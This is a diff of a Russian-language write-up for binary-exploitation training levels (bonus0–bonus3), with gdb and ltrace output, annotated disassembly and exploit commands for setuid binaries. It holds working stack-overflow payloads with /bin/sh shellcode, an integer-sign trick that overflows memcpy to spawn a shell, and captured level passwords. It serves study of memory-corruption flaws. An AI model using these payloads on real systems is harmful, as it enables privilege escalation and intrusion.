@@ -48,9 +48,9 @@ bonu0 bonu1 bonu02 bonu3 end
 | [level8](#lvl8)        | неаккуратное использование malloc:<br>strdup()<br>strcpy() | gdb, работа с памятью - правильно передать в программу аргументы для заполнения памяти в нужных местах | c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a |
 | [level9](#lvl9)        | Использование memcpy() без проверки допустимой длины для копирования. | gdb <br><br> Атака:<br>1. Переполнение буфера и расчет смещения.<br>2. Выбор для исполнения в буфере shellcode.<br>3. Подстановке шеллкода и нужных адресов в переполненный буфер. | f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728 |
 | [bonus0](#bonus0)      | Копирование в буфер строки при недостаточной проверке на переполнение. <br><br>Уязвимые функции:<br>strcpy(fullname, first);<br>strcat(fullname, " ");<br>strcat(fullname, last); | gdb <br><br> Атака:<br>1. Переполнение буфера и расчет смещения.<br>2. Выбор для исполнения в буфере shellcode.<br>3. Подстановке шеллкода и нужных адресов в переполненный буфер. | cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9 |
-| [bonus1](#bonus1)      |  |  |  |
+| [bonus1](#bonus1)      | наличие в коде execl("/bin/sh")<br> | gdb<br><br> Атака:<br>переполнение буфера и перезапись переменной | 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245 |
 | [bonus2](#bonus2)      |  |  |  |
-| [bonus3](#bonus3)      |  |  |  |
+| [bonus3](#bonus3)      | наличие в коде execl("/bin/sh")<br> | gdb<br><br>Атака:<br>анализ disassemble main и верный подбор аргументов для программы | 3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c |
 
 #
 ###### [вернуться к содержанию](#content)
@@ -580,7 +580,7 @@ gdb level1
 # 0xbffff6e0:     0xbffff847      0xbffff85e      0xbffff876      0xbffff886
 
 ```
-`C` выровнены начиная с адреса `0xbffff640` - это именно то место, куда будет положен shellcode и NOP-срезы.
+`C` выровнены начиная с адреса `0xbffff640` - это именно то место, куда будет положен shellcode и NOP (\x90).
 
 Запуск в дебаггере  кода с выводом от команды \
 `(python -c 'print "A"*76 + "\x40\xf6\xff\xbf" + "\x90" * 40 + "\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1"')` \
@@ -590,7 +590,7 @@ gdb level1
 `(python -c 'print "A"*76 + "\x40\xf6\xff\xbf" + "\x90" * 40 + "\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1"'; cat) | ./level1 ` \
 и оболочка не открывается, потому что я не попадаю на шелл код. Это связано с тем, что при запуске в дебаггере и без него адреса немного отличаются (разные переменные окружения, которые кладутся перед кодом программы).
 
-Подбираю правильный адрес (подошел на 16*3 байт больше), чтобы попасть на NOP-срез и проскользить до shellcode:
+Подбираю правильный адрес (подошел на 16*3 байт больше), чтобы попасть на NOP (\x90) и проскользить до shellcode:
 ```sh
 (python -c 'print "A"*76 + "\x70\xf6\xff\xbf" + "\x90" * 40 + "\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1"'; cat) | ./level1 
         whoami
@@ -943,7 +943,7 @@ ___
 
 Адрес кучи `0x804a008` .
 
-Узнаю смещение адреса возврата функции, [воспользовавшись сайтом](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) . Добиваю буфер до нужного размера переполнения (shellcode + NOP-срезы) + адрес кучи.
+Узнаю смещение адреса возврата функции, [воспользовавшись сайтом](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) . Добиваю буфер до нужного размера переполнения (shellcode + NOP) + адрес кучи.
 
 ![Смещение:](./README/level2_buf_overflow.png)
 Нужное смещение 80 байт.
@@ -3007,7 +3007,7 @@ No function contains specified address.
 # eip            0x804856c        0x804856c <main+8>
 
 0x08048572 <+14>:  jmp  0x8048575 <main+17> # перейти сразу к <main+17>
-0x08048574 <+16>:  nop                      # ничего не делать (наш \x90 NOP-срез в лвл1, лвл2 так выглядит на asm)
+0x08048574 <+16>:  nop                      # ничего не делать (наш \x90 NOP в лвл1, лвл2 так выглядит на asm)
 
 # 2. Подготовка к вызову printf():
 0x08048575 <+17>:  mov  0x8049ab0,%ecx  # x -> 0x8049ab0 <service>:  0x00000000
@@ -3576,7 +3576,7 @@ ltrace ./level9 AAAA BBBB
 
 </details> 
 
-<details><summary> gdb level9 -> disassemble на список функций </summary>
+<details><summary> gdb level9 -> info functions </summary>
 
 ```sh
 gdb level9
@@ -4332,8 +4332,7 @@ End of assembler dump.
 
 ```
 Про 34 и 7: \
-Адрес буфера может немного отличаться при запуске бинарного файла в gdb и без gdb, поэтому перед shellcode кладу в буфер мусор или NOP. Опытным путем выяснила, что до кода должно быть не менее 34 символов. Далее в буфер будут положены данные от второго ввода: мусор 9 символов, адрес на начало буфера, любые символы от 7 символов (максимум 34, точное количество зависит от количество символов в начале буфера). \
-И вводя вместо 34 больше символов-заполнителей важно не перестараться, чтобы не переполнить и этот буфер (4096 байт).
+Адрес буфера может немного отличаться при запуске бинарного файла в gdb и без gdb, поэтому перед shellcode кладу в буфер мусор или NOP. Опытным путем выяснила, что до кода должно быть не менее 34 символов. Далее в буфер будут положены данные от второго ввода: мусор 9 символов, адрес на начало буфера, любые символы от 7 символов (максимум 34, точное количество зависит от количество символов в начале буфера). 
 
 Атакую: 
 ```sh
@@ -4354,6 +4353,106 @@ su bonus1
 ```
 
 <br>
+
+<details> 
+  <summary> Черновые расчеты. Поиск иных решений. </summary>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+```sh
+export SHELLCODE=$'\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1'
+
+echo '#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main() {
+        printf("%p\n", getenv("SHELLCODE"));
+        return 0;
+}' > /tmp/env_addr.c
+
+gcc /tmp/env_addr.c -o /tmp/env_addr
+/tmp/env_addr
+# ||
+# \/
+# 0xbffff85b
+
+(python -c 'print "A" * 4095 + "\x0a"'; python -c 'print "Aa0Aa1Aa2" + "\x5b\xf8\xff\xbf" + "B" * (4096-14) + "\x0a"'; cat) | ./bonus0
+```
+
+
+```
+
+export SHELLCODE=$'\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81'
+0xbffff84b
+
+
+import sys
+
+def pad_to_4096(str):
+        return str + 'A' * (4096 - 1 - len(str)) + '\n'
+
+nop_sled = '\x90' * 70
+shellcode_address = '\x20\xf6\xff\xbf'
+shellcode = "\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1"
+
+sys.stdout.write(pad_to_4096('X' * 20))
+sys.stdout.write(pad_to_4096('Aa0Aa1Aa2%s%s%s' % (shellcode_address, nop_sled, shellcode)))
+```
+
+
+```sh
+python -c 'print "A"*9 + "B" * 4 + "C" * 102'
+AAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+
+(gdb) r
+Starting program: /home/user/bonus0/bonus0 
+ - 
+1234567890asdfghjklzXXXX
+ - 
+AAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+1234567890asdfghjklzAAAAAAAAABBBBCCCCCCC��� AAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+(gdb) x/32xw $esp-16
+(gdb) x/32xw $esp-16
+0xbffff5f0:     0x4120b7fd      0x41414141      0x41414141      0x42424242
+0xbffff600:     0x43434343      0xf4434343      0x00b7fd0f      0xb7fdc858
+0xbffff610:     0x00000000      0xbffff61c      0xbffff69c      0x00000000
+0xbffff620:     0x0804824c      0xb7fd0ff4      0x00000000      0x00000000
+0xbffff630:     0x00000000      0xc7f15fff      0xf0b47bef      0x00000000
+0xbffff640:     0x00000000      0x00000000      0x00000001      0x08048400
+0xbffff650:     0x00000000      0xb7ff26b0      0xb7e453e9      0xb7ffeff4
+0xbffff660:     0x00000001      0x08048400      0x00000000      0x08048421
+
+(python -c 'print "A" * 20'; python -c 'print "Aa0Aa1Aa2" + "\x20\xf6\xff\xbf" + "\x90" * 70 + "\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1"'; cat) | ./bonus0
+
+102 - 32 = 70
+```
+
+
+
+
+
+
+7 & 1 == 1  \
+6 & 1 == 0
+
+</details> 
+
 
 <details> 
   <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
@@ -4414,43 +4513,274 @@ RELRO      STACK CANARY      NX            PIE             RPATH      RUNPATH   
 <font class=off>No RELRO   No canary found   NX disabled   No PIE</font>          <font class=on>No RPATH   No RUNPATH</font>   <font class=filePath>/home/user/bonus1/bonus1</font>
 </pre> -->
 
-<!-- ![bonus1](./README/bonus1.png) -->
+![bonus1](./README/bonus1.png)
 
-<!-- Проверяю содержимое домашней директории пользователя и свойства содержимого: 
+Проверяю содержимое домашней директории пользователя и свойства содержимого: 
 <details><summary> ls -la </summary>
 
 ```sh
+ls -la
+# ||
+# \/
+# -rwsr-s---+ 1 bonus2 users  5043 Mar  6  2016 bonus1
 ```
 ---
 </details>
-<details><summary> getfacl level8 </summary>
+<details><summary> getfacl bonus1 </summary>
 
 ```sh
+# # file: bonus1
+# # owner: bonus2
+# # group: users
+# # flags: ss-
+# user::rwx
+# user:bonus1:r-x
+# user:bonus2:r-x
+# group::---
+# mask::r-x
+# other::---
 ```
 ---
 
 </details>
-<details><summary> ./level8 </summary>
+<details><summary> ./bonus1 </summary>
 
 ```sh
+./bonus1 
+# ||
+# \/
+Segmentation fault (core dumped)
+
+./bonus1 AAAA ; echo $?
+# ||
+# \/
+0
+
+./bonus1 AAAA BBBB ; echo $?
+# ||
+# \/
+0
+
+./bonus1 5; echo $?
+# ||
+# \/
+# Segmentation fault (core dumped)
+# 139
+
+./bonus1 42 ; echo $?
+# ||
+# \/
+# 1
+
+./bonus1 5 ; echo $?
+# ||
+# \/
+# Segmentation fault (core dumped)
+# 139
+
+./bonus1 5 42 ; echo $?
+# ||
+# \/
+# 0
 ```
 ---
 
 </details>
-<details><summary> ltrace ./level8 </summary>
+<details><summary> ltrace ./bonus1 </summary>
 
 ```sh
+ltrace ./bonus1 AAAA
+# ||
+# \/
+# __libc_start_main(0x8048424, 2, 0xbffff6e4, 0x80484b0, 0x8048520 <unfinished ...>
+# atoi(0xbffff836, 0x8049764, 2, 0x80482fd, 0xb7fd13e4)                = 0
+# memcpy(0xbffff614, NULL, 0)                                          = 0xbffff614
+# +++ exited (status 0) +++
+
+ltrace ./bonus1 42
+# ||
+# \/
+# __libc_start_main(0x8048424, 2, 0xbffff6e4, 0x80484b0, 0x8048520 <unfinished ...>
+# atoi(0xbffff838, 0x8049764, 2, 0x80482fd, 0xb7fd13e4)                = 42
+# +++ exited (status 1) +++
+
+ltrace ./bonus1 5 42
+# ||
+# \/
+# __libc_start_main(0x8048424, 3, 0xbffff6e4, 0x80484b0, 0x8048520 <unfinished ...>
+# atoi(0xbffff836, 0x8049764, 3, 0x80482fd, 0xb7fd13e4)                = 5
+# memcpy(0xbffff614, "42", 20)                                         = 0xbffff614
+# +++ exited (status 0) +++
 ```
 ---
 
 </details>
-<details><summary> gdb level8 -> disassemble на список функций </summary>
+<details><summary> gdb bonus1 -> info functions </summary>
 
 ```sh
+(gdb) info functions
+# ||
+# \/
+# 0x08048320  memcpy
+# 0x08048350  execl
+# 0x08048360  atoi
+# 0x08048424  main
+# ...
 ```
 ---
-</details> -->
+</details>
 
+<br><br>
+
+Коротко:
+<details> 
+  <summary> disassemble main() в развороте </summary>
+
+```sh
+(gdb) disassemble main
+# Dump of assembler code for function main:
+# 1. создается стековый фрейм (stack frame) или кадр стека:
+0x08048424 <+0>:     push   %ebp             # сохраняет в стеке содержимое регистра EBP  
+0x08048425 <+1>:     mov    %esp,%ebp        # присваивает регистру EBP значение ESP      
+0x08048427 <+3>:     and    $0xfffffff0,%esp # выравнивание стека по 16-байтовой границе, то есть каждая созданная переменная и выделенная в функции main область памяти будет выравниваться до размера, кратного 16 байтам.      
+0x0804842a <+6>:     sub    $0x40,%esp       # выделяется 40 (hex) = 64 (dec) байт под локальные переменные
+
+# 2. Подготовка и вызов функции atoi():
+0x0804842d <+9>:   mov  0xc(%ebp),%eax       # указатель на массив argv (x/s *$eax -> "/home/user/bonus1/bonus1")
+0x08048430 <+12>:  add  $0x4,%eax            # получение адреса argv[1]
+0x08048433 <+15>:  mov  (%eax),%eax          # получение значения argv[1]
+0x08048435 <+17>:  mov  %eax,(%esp)          # значение первого аргумента передано в функцию
+0x08048438 <+20>:  call 0x8048360 <atoi@plt> # вызов atoi(argv[1])
+0x0804843d <+25>:  mov  %eax,0x3c(%esp)      # число сохранено на стеке - в локальной переменной (назову ее nb)
+
+# 3. Сравнение с числом 9 значения argv[1], переведенного в число:
+0x08048441 <+29>:  cmpl $0x9,0x3c(%esp)      # nb (argv[1] после atoi) сравнивается c 9
+0x08048446 <+34>:  jle  0x804844f <main+43>  # если nb равно или меньше 9, переход к пункту 7.2.
+                                             # иначе:
+0x08048448 <+36>:  mov  $0x1,%eax            # 1 будет передано как код завершения программы
+0x0804844d <+41>:  jmp  0x80484a3 <main+127> # перейти к завершению и выходу из программы
+
+# 4. Подготовка и вызов функции memcpy():
+# 4.1. Подготовка 3го аргумента:
+0x0804844f <+43>:  mov  0x3c(%esp),%eax        # nb (argv[1] после atoi) положен в eax
+0x08048453 <+47>:  lea  0x0(,%eax,4),%ecx      # nb * 4 помещено в регистр ecx
+# https://stackoverflow.com/questions/37239885/what-is-leal-edx-edx-4-eax-means
+# 4.2. Подготовка 2го аргумента:
+0x0804845a <+54>:  mov  0xc(%ebp),%eax         # указатель на массив argv (x/s *$eax -> "/home/user/bonus1/bonus1")
+0x0804845d <+57>:  add  $0x8,%eax              # получение адреса argv[2]
+0x08048460 <+60>:  mov  (%eax),%eax            # получение значения argv[2]
+0x08048462 <+62>:  mov  %eax,%edx              # значение argv[2] помещено в регистр edx
+# 4.3. Подготовка 1го аргумента:
+0x08048464 <+64>:  lea  0x14(%esp),%eax        # получен указатель на буфер локальный
+# 4.4. Передача аргументов и вызов функции:
+0x08048468 <+68>:  mov  %ecx,0x8(%esp)         # nb * 4 (argv[1] после atoi) передан 3м аргументом
+0x0804846c <+72>:  mov  %edx,0x4(%esp)         # argv[2] передан                      2м аргументом
+0x08048470 <+76>:  mov  %eax,(%esp)            # указатель на буфер передан           1м аргументом
+0x08048473 <+79>:  call 0x8048320 <memcpy@plt> # вызов memcpy(буфер, argv[2], nb * 4)
+
+# 5. Сравнение nb и 0x574f4c46:
+0x08048478 <+84>:  cmpl $0x574f4c46,0x3c(%esp) # cравнение nb и 0x574f4c46 (hex) = 1464814662 (dec)
+0x08048480 <+92>:  jne  0x804849e <main+122>   # если не равно, то перейти к пункту 7
+
+# 6. Подготовка и вызов функции execl():
+0x08048482 <+94>:  movl $0x0,0x8(%esp)         # 0 передано           3м аргументом
+0x0804848a <+102>: movl $0x8048580,0x4(%esp)   # "sh" передано        2м аргументом
+                                               # x/s 0x8048580 -> "sh"
+0x08048492 <+110>: movl $0x8048583,(%esp)      # "/bin/sh" передано   1м аргументом
+                                               # x/s 0x8048583 -> "/bin/sh"
+0x08048499 <+117>: call 0x8048350 <execl@plt>  # вызов execl("/bin/sh", "sh", 0)
+
+# 7. Завершение и возврат из main():
+# 7.1. 1 будет передано как код завершения программы:
+0x0804849e <+122>: mov  $0x0,%eax # подготовка к return 0
+# 7.2. Завершение и возврат из main():
+0x080484a3 <+127>: leave
+0x080484a4 <+128>: ret  
+# End of assembler dump.
+
+```
+---
+</details>
+
+```c
+int main(int argc, char** argv) {
+
+    int nb = atoi(argv[1]); // int 4(dec) 
+    буфер[40];  // <+6> 40(hex) - <+64> 14(hex)  - 4 int строкой выше = 22(hex) = 40 (dec)
+                            
+    if (nb > 9)
+        return 1;
+
+    memcpy(буфер, argv[2], nb * 4);
+//                         надо 44, 40 буфер заполнить + 4 int перезаписать
+// 0x574f4c46 - должны быть последние 4 байта
+
+    if (nb == (0x574f4c46 (hex) или  1464814662(dec)) )
+        execl("/bin/sh", "sh", 0);
+    return 0;
+}
+```
+Задача: \
+попасть на `execl("/bin/sh", "sh" ,NULL)`:
+
+1. argv[1]
+
+<details> <summary> поиск argv[1] в развороте. </summary>
+
+Чтобы попасть на `execl("/bin/sh", "sh" ,NULL)`, введенное значение argv[1] `nb` должно быть `0x574f4c46`. \
+В то же время из строки `if (nb > 9)` видно, что напрямую ввести такое число не получится. Зато такое число можно перезаписать, используя уязвимость к переполнению буфера: \
+`memcpy(буфер, argv[2], nb * 4)` \
+Буфер 40 байт + число 4 байта, значит: \
+`nb * 4` = 44, \
+`nb` = 11.
+
+`11 > 9`, но я могу ввести `11` с помощью отрицательного числа: 
+
+Двоичное представление нахожу [с помощью калькулятора](https://www.rapidtables.com/convert/number/decimal-to-binary.html): 
+```
++11: 0000 0000 0000 0000 0000 0000 0000 1011 
+-11: 1000 0000 0000 0000 0000 0000 0000 1011
+```
+
+Умножить на 4 - это битовый сдвиг влево на два:
+```sh
+# -11: 
+      1000 0000 0000 0000 0000 0000 0000 1011
+# При сдвиге влево старший знаковый бит затрется.
+# -11 << 2:
+      0000 0000 0000 0000 0000 0000 0010 1100 # -11 * 4 = 44
+```
+Перевожу [с помощью калькулятора  - строка Binary signed 2's complement (32 digits)](https://www.rapidtables.com/convert/number/decimal-to-binary.html)\
+`1000 0000 0000 0000 0000 0000 0000 1011` в десятичное число 
+`- 2 147 483 637`
+
+</details>
+
+```sh
+./bonus -2147483637 ??????
+```
+2. argv[2]
+
+передать массив 40 байт + 0x574f4c46
+```sh
+$(python -c 'print "A" * 40 + "\x57\x4f\x4c\x46"[::-1]')
+```
+
+3. Атакую:
+```sh
+./bonus1 -2147483637  $(python -c 'print "A" * 40 + "\x57\x4f\x4c\x46"[::-1]')
+# ||
+# \/
+# $ whoami
+# bonus2
+# $ cat /home/user/bonus2/.pass
+# 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+```
+Уровень пройден!
+```sh
+su bonus2
+# Password: 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+```
 <details> 
   <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
 <pre>
@@ -4494,42 +4824,107 @@ RELRO      STACK CANARY      NX            PIE             RPATH      RUNPATH   
 <font class=off>No RELRO   No canary found   NX disabled   No PIE</font>          <font class=on>No RPATH   No RUNPATH</font>   <font class=filePath>/home/user/bonus2/bonus2</font>
 </pre> -->
 
-<!-- ![bonus2](./README/bonus2.png) -->
+![bonus2](./README/bonus2.png)
 
-<!-- Проверяю содержимое домашней директории пользователя и свойства содержимого: 
+Проверяю содержимое домашней директории пользователя и свойства содержимого: 
 <details><summary> ls -la </summary>
 
 ```sh
+ls -la
+# ||
+# \/
+# ...
+# -rwsr-s---+ 1 bonus3 users  5664 Mar  6  2016 bonus2
 ```
 ---
 </details>
-<details><summary> getfacl level8 </summary>
+<details><summary> getfacl bonus2 </summary>
 
 ```sh
+getfacl bonus2
+# ||
+# \/
+# # file: bonus2
+# # owner: bonus3
+# # group: users
+# # flags: ss-
+# user::rwx
+# user:bonus2:r-x
+# user:bonus3:r-x
+# group::---
+# mask::r-x
+# other::---
 ```
 ---
 
 </details>
-<details><summary> ./level8 </summary>
+<details><summary> ./bonus2 </summary>
 
 ```sh
+./bonus2 ; echo $?
+# ||
+# \/
+# 1
+
+./bonus2 5; echo $?
+# ||
+# \/
+# 1
+
+./bonus2 5 2; echo $?
+# ||
+# \/
+# Hello 5
+# 8
 ```
 ---
 
 </details>
-<details><summary> ltrace ./level8 </summary>
+<details><summary> ltrace ./bonus2 </summary>
 
 ```sh
+ltrace ./bonus2
+# ||
+# \/
+# __libc_start_main(0x8048529, 1, 0xbffff6b4, 0x8048640, 0x80486b0 <unfinished ...>
+# +++ exited (status 1) +++
+
+ltrace ./bonus2 5 18
+# ||
+# \/
+# __libc_start_main(0x8048529, 3, 0xbffff6b4, 0x8048640, 0x80486b0 <unfinished ...>
+# strncpy(0xbffff5b0, "5", 40)                                         = 0xbffff5b0
+# strncpy(0xbffff5d8, "18", 32)                                        = 0xbffff5d8
+# getenv("LANG")                                                       = "en_US.UTF-8"
+# memcmp(0xbffffed3, 0x804873d, 2, 0xb7fff918, 0)                      = -1
+# memcmp(0xbffffed3, 0x8048740, 2, 0xb7fff918, 0)                      = -1
+# strcat("Hello ", "5")                                                = "Hello 5"
+# puts("Hello 5"Hello 5
+# )                                                      = 8
+# +++ exited (status 8) +++
 ```
 ---
 
 </details>
-<details><summary> gdb level8 -> disassemble на список функций </summary>
+<details><summary> gdb bonus2 -> info functions </summary>
 
 ```sh
+gdb bonus2
+(gdb) info functions
+# ||
+# \/
+# 0x08048360  memcmp
+# 0x08048370  strcat
+# 0x08048380  getenv
+# 0x08048390  puts
+# 0x080483c0  strncpy
+# 0x08048484  greetuser
+# 0x08048529  main
+# ...
+
 ```
 ---
-</details> -->
+</details>
 
 <details> 
   <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
@@ -4620,42 +5015,293 @@ RELRO      STACK CANARY      NX            PIE             RPATH      RUNPATH   
 <font class=off>No RELRO   No canary found   NX disabled   No PIE</font>          <font class=on>No RPATH   No RUNPATH</font>   <font class=filePath>/home/user/bonus3/bonus3</font>
 </pre> -->
 
-<!-- ![bonus3](./README/bonus3.png) -->
+![bonus3](./README/bonus3.png)
 
-<!-- Проверяю содержимое домашней директории пользователя и свойства содержимого: 
+Проверяю содержимое домашней директории пользователя и свойства содержимого: 
 <details><summary> ls -la </summary>
 
 ```sh
+ls -la
+# ||
+# \/
+# -rwsr-s---+ 1 end    users  5595 Mar  6  2016 bonus3
 ```
 ---
 </details>
-<details><summary> getfacl level8 </summary>
+<details><summary> getfacl bonus3 </summary>
 
 ```sh
+getfacl bonus3
+# ||
+# \/
+# # file: bonus3
+# # owner: end
+# # group: users
+# # flags: ss-
+# user::rwx
+# user:bonus3:r-x
+# user:end:r-x
+# group::---
+# mask::r-x
+# other::---
 ```
 ---
 
 </details>
-<details><summary> ./level8 </summary>
+<details><summary> ./bonus3 </summary>
 
 ```sh
+./bonus3 ; echo $?
+# ||
+# \/
+# 255
+
+./bonus3 42 ; echo $?
+# ||
+# \/
+# 
+# 0
+
+./bonus3 42 21 ; echo $?
+# ||
+# \/
+# 255
 ```
 ---
 
 </details>
-<details><summary> ltrace ./level8 </summary>
+<details><summary> ltrace ./bonus3 </summary>
 
 ```sh
+ltrace ./bonus3
+# ||
+# \/
+# __libc_start_main(0x80484f4, 1, 0xbffff6b4, 0x8048620, 0x8048690 <unfinished ...>
+# fopen("/home/user/end/.pass", "r")                                   = 0
+# +++ exited (status 255) +++
+
+ltrace ./bonus3 42
+# ||
+# \/
+# __libc_start_main(0x80484f4, 2, 0xbffff6b4, 0x8048620, 0x8048690 <unfinished ...>
+# fopen("/home/user/end/.pass", "r")                                   = 0
+# +++ exited (status 255) +++
+
+ltrace ./bonus3 42 21
+# ||
+# \/
+# __libc_start_main(0x80484f4, 3, 0xbffff6b4, 0x8048620, 0x8048690 <unfinished ...>
+# fopen("/home/user/end/.pass", "r")                                   = 0
+# +++ exited (status 255) +++
 ```
 ---
 
 </details>
-<details><summary> gdb level8 -> disassemble на список функций </summary>
+<details><summary> gdb bonus3 -> info functions </summary>
 
 ```sh
+gdb bonus3
+(gdb) info functions
+# ||
+# \/
+# 0x080483b0  strcmp
+# 0x080483c0  fclose
+# 0x080483d0  fread
+# 0x080483e0  puts
+# 0x08048410  fopen
+# 0x08048420  execl
+# 0x08048430  atoi
+# 0x080484f4  main
+# ...
+
 ```
 ---
-</details> -->
+</details>
+
+Из `gdb bonus3` видно, что в программе только одна небиблиотечная функция `main()`.
+
+<details><summary> disassemble main в развороте. </summary>
+
+```sh
+(gdb) disassemble main
+# Dump of assembler code for function main:
+# 1. создается стековый фрейм (stack frame) или кадр стека:
+0x080484f4 <+0>:  push  %ebp                  # сохраняет в стеке содержимое регистра EBP  
+0x080484f5 <+1>:  mov   %esp,%ebp             # присваивает регистру EBP значение ESP      
+0x080484f7 <+3>:  push  %edi
+0x080484f8 <+4>:  push  %ebx
+0x080484f9 <+5>:  and   $0xfffffff0,%esp      # выравнивание стека по 16-байтовой границе, то есть каждая созданная переменная и выделенная в функции main область памяти будет выравниваться до размера, кратного 16 байтам.      
+0x080484fc <+8>:  sub   $0xa0,%esp            # выделяется a0 (hex) = 160 (dec) байт под локальные переменные
+
+# 2. Подготовка и вызов функции fopen():
+0x08048502 <+14>: mov  $0x80486f0,%edx        # "r"
+0x08048507 <+19>: mov  $0x80486f2,%eax        # "/home/user/end/.pass"
+0x0804850c <+24>: mov  %edx,0x4(%esp)         # "r"            передано           2м аругментом
+0x08048510 <+28>: mov  %eax,(%esp)            # "/home/user/end/.pass" передано   1м аругментом
+0x08048513 <+31>: call 0x8048410 <fopen@plt>  # fopen("/home/user/end/.pass", "r")
+0x08048518 <+36>: mov  %eax,0x9c(%esp)        # FILE *f
+
+# 3. Заполнить буфер 0:
+0x0804851f <+43>: lea  0x18(%esp),%ebx        # буфер
+0x08048523 <+47>: mov  $0x0,%eax              # 0 положен в eax
+0x08048528 <+52>: mov  $0x21,%edx             # 33 положено в edx # 33*4(4хбайтовые регистры) = 132
+0x0804852d <+57>: mov  %ebx,%edi
+0x0804852f <+59>: mov  %edx,%ecx
+0x08048531 <+61>: rep stos %eax,%es:(%edi)    # 0 заполнить 132 байта буфера
+
+# 4. if (f == 0) то в п. return -1:
+0x08048533 <+63>: cmpl $0x0,0x9c(%esp)        # если файл не открылся
+0x0804853b <+71>: je   0x8048543 <main+79>    # перейти к <main+79> (return -1)
+
+# 5. if (argc != 2) то в п. return -1:
+0x0804853d <+73>: cmpl $0x2,0x8(%ebp)         # argc должно быть 2, иначе на выход
+0x08048541 <+77>: je   0x804854d <main+89>
+
+# 6. Положено значение для return -1:
+0x08048543 <+79>: mov  $0xffffffff,%eax       # -1 передано для return
+0x08048548 <+84>: jmp  0x8048615 <main+289>   # на выход
+
+# 7. Подготовка и вызов функции fread():
+0x0804854d <+89>:  lea  0x18(%esp),%eax       # буфер
+0x08048551 <+93>:  mov  0x9c(%esp),%edx       # FILE *f
+0x08048558 <+100>: mov  %edx,0xc(%esp)        # FILE *f       передан    4м аргументом
+0x0804855c <+104>: movl $0x42,0x8(%esp)       # 42 = 66 (dec) передано   3м аргументом
+0x08048564 <+112>: movl $0x1,0x4(%esp)        # 1             передано   2м аргументом
+0x0804856c <+120>: mov  %eax,(%esp)           # буфер         передан    1м аргументом
+0x0804856f <+123>: call 0x80483d0 <fread@plt> # fread(буфер , 1, 66, f)
+#  size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream);
+
+# 8. буфер[65] = 0:
+0x08048574 <+128>: movb $0x0,0x59(%esp)       # зануление буфер[65] = 0
+                                              #        0x59(%esp) - 0x18(%esp)
+                                              # Hex value:     59 - 18 = 41
+                                              # Decimal value: 89 - 24 = 65
+# 9. буфер[ atoi(argv[1]) ] = 0:
+# 9.1. Подготовка и вызов функции atoi():
+0x08048579 <+133>: mov  0xc(%ebp),%eax        # argv
+0x0804857c <+136>: add  $0x4,%eax             # argv + 1
+0x0804857f <+139>: mov  (%eax),%eax           # argv[1]
+0x08048581 <+141>: mov  %eax,(%esp)           # строка передана аргументом
+0x08048584 <+144>: call 0x8048430 <atoi@plt>  # atoi(argv[1])
+# 9.2. буфер[ atoi(argv[1]) ] = 0:
+0x08048589 <+149>: movb $0x0,0x18(%esp,%eax,1) # буфер[ atoi(argv[1]) ] = 0
+
+# 10. Подготовка и вызов функции fread():
+0x0804858e <+154>: lea  0x18(%esp),%eax       # буфер 
+0x08048592 <+158>: lea  0x42(%eax),%edx       # буфер[66] в edx
+0x08048595 <+161>: mov  0x9c(%esp),%eax       #
+0x0804859c <+168>: mov  %eax,0xc(%esp)        # FILE *f     4м аргументом
+0x080485a0 <+172>: movl $0x41,0x8(%esp)       # 65          3м аргументом
+0x080485a8 <+180>: movl $0x1,0x4(%esp)        # 1           2м аргументом
